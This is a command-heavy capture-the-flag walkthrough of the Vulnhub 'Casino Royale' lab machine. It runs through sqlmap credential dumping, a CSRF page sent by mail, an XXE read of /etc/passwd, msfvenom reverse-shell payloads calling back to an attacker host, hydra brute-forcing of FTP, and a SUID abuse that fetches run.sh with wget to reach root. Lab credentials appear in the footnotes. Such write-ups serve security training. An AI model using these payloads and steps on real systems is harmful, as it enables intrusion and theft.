## 1 Vulnhub Walkthrough

### **Penetrating Methodologies**

- IP discovery and Port Scanning.
- Browsing the IP on port 8080.
- Discovering accessible directories on the victim’s machine.
- Searching exploits via searchsploit.
- Using SQLMAP to find database and login credentials.
- Browsing directories on the browser.
- Adding Domain name to /etc/hosts file.
- Searching exploits via searchsploit.
- Using Cross-Site Request Forgery Exploit code.
- Using telnet to connect to port 25.
- Tail off the access.log file.
- Browsing directories on a browser.
- Exploiting XML External Entity vulnerability.
- Using curl to send the file.
- Creating a PHP shell using msfvenom.
- Using hydra to brute force FTP login Password.
- Logging into Ftp.
- Using Multi/handler of Metasploit Framework.
- Enumerating through directories.
- Getting Login Credentials.
- Looking for SUID file and directories.
- Creating a bash shell using msfvenom.
- Using Netcat listener to get a reverse shell.
- Getting Root Access.
- Reading the Flag.

### **Walkthrough**

`netdiscover -r 192.168.1.1/24`

`nmap -p- -sV 192.168.1.102`

`dirb http://192.168.1.102/`

`url http://192.168.1.102/index.php`

```bash
# The page revealed a pokermax software term
searchsploit poker
searchsploit -m 6766
cat 6766.txt
url http://192.168.1.102/pokeradmin/index.php
```

`sqlmap -u http://192.168.1.102/pokeradmin/index.php --forms --risk 3 --level 5 --dbs --batch`

`sqlmap -u http://192.168.1.102/pokeradmin/index.php --forms --risk 3 --level 5 -D pokerleague --dump-all --batch` [^1]

`host add_line > 192.168.1.102	casino-royale.local`

`url http://casino-royale.local/vip-client-portfolios/?url=blog`

```bash
searchsploit snowfox
searchsploit -m 35301
cp /root/35301.html /var/www/html/raj.html
# make some minor changes on raj.html
# and then restart the service for apache2
service apache2 restart
```

```bash
# Let’s connect to port 25 using telnet. We will be sending a mail to recipient valenka along with the link of raj.html file.
telnet casino-royale.local 25
mail from: user
rcpt to :valenka
data
subject : obanno
> hi
> http://192.168.1.107/raj.html
> bye
quit
```

`tail -n1 -f /var/log/apache2/access.log` [^2]

`url http://casino-royale.local/vip-client-portfolios/?uri=signin` [^3]

`url http://casino-royale.local/ultra-access-view/main.php `[^4]

`curl -d @xml.txt http://casino-royale.local/ultra-access-view/main.php` [^5]

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.107 lport=443 -f raw > shell.php5` [^6]

`hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.102 `[^7]

```bash
# Let’s just Login into FTP,and send .php5 files or files with no extension. then  upload our shell and gave permissions to execute.
ftp 192.168.1.102 21
put shell.php5
chmod 777 shell.php5
```

```bash
# After uploading our shell, we set up a listener using Metasploit-framework.
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.107
msf exploit(multi/handler) > set lport 443
msf exploit(multi/handler) > run
# We got the reverse shell, but it is not a proper shell. We will spawn（生成） a tty shell using python.
meterpreter > shell
meterpreter > python -c "import pty; pty.spawn('/bin/bash')"
# find sql config.php file located on /var/www/html/includes/ , and read the contents of config.php , we get DBusername and DBpassword
```

`su valenka`

`password: 11archives11!`

`find / -perm -4000 2> /dev/null` [^8]

`cd /tmp` [^9]

`msfvenom –p cmd/unix/reverse_netcat lhost=192.168.1.107 lport=1234 R` [^10]

`vim run.sh && python -m SimpleHTTPServer 8000`

`wget http://192.168.1.107:8000/run.sh` [^11]

`/opt/casino-royale/mi6_detect_test`

```bash
# This time on running the SUID file, it gave a reverse shell on our netcat listener.  Finally, we have got the root access and read the FLAG!!
nc -lvp 1234
id
cd/root
ls
cd flag
cat flag.sh
```

[原文](https://www.hackingarticles.in/casino-royale-1-vulnhub-walkthrough/)

---

[^1]: We have got the required credentials. **Username: admin** **Password: raise12million**
[^2]: We have just tail off the access log of apache2.
[^3]: Let’s Login with the credentials, we have given in the raj.html file in the **Signin****section** of the page **casino-royale.local/vip-client-portfolios/?uri=signin** **Email address:** [**user@user.local**](mailto:user@user.local) **Password: password**
[^4]: his gave us a hint to use an **XML External Entity injection** for our next step.
[^5]: looked for a **code** for **XML External Entity injection [online](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection). Therefore, we created a new file **xml.txt and pasted the code by making some minor changes. Let’s send our **XML External Entity Injection** in **file** **xml.txt** using curl. it gave us the **/etc/passwd** file
[^6]: We have created a **PHP shell** payload using **msfvenom**.
[^7]: We have used **hydra** to find the **password** of username **ftpUserULTRA** for **Ftp Login.** We have cracked the password for ftp login i.e **bankbank**
[^8]: After that, we tried to find files with SUID bit permissions. Here we found an interesting **Suid file and directory.** :**/opt/casino-royale/mi6_detect_test**
[^9]: On running the **SUID file**, we see it is most likely using a **run.sh** file but there no such file or directory. **Since the run.sh has no permissions**.  So we decided to move to **/tmp** directory.
[^10]: We need to create a bash code using Msfvenom. After that, we have copied the code in **run.sh** and executed python server.
[^11]: We have downloaded the file in the **/tmp** directory. Again ran the SUID file.